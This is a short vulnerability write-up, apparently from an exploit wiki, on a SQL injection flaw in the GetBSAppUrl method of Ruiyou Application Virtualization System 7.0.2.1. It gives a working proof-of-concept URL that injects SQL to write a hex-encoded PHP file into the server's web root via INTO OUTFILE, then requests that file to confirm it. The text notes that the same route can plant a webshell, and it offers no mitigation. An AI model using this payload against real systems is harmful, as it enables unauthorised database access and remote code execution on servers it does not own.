# Ruiyou Application Virtualization System GetBSAppUrl SQL Injection Vulnerability

## Vulnerability Description

Ruiyou Application Virtualization System The GetBSAppUrl method has a SQL injection vulnerability. Since the parameter incoming is not filtered, SQL injection occurs. The attacker can obtain database sensitive information through the vulnerability.

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">Ruiyou Application Virtualization System 7.0.2.1</span>

## Network surveying and mapping



## Vulnerability reappears

Login page

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1681181309572-a70542e4-5ec8-4441-bf73-d097a59be7d5.png)



There is a SQL injection vulnerability in the GetBSAppUrl method, through which the vulnerability can be written to the Webshell file

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1681187680384-430aaff0-d568-4144-ac8b-bd2ff471e2b3.png)

Verify POC

```plain
/index.php?s=/Agent/GetBSAppUrl/AppID/')%3bselect+0x3c3f70687020706870696e666f28293b3f3e+into+outfile+%27C%3a\\Program+Files+(x86)\\RealFriend\\Rap+Server\\WebRoot\\test7.php%27%23/123
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1681188074734-58253667-cdba-4a7e-88ad-87e0d63658cb.png)

```plain
/test7.php
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1681181764154-3a7a73d8-20a2-4a11-b837-ac9d0363955b.png)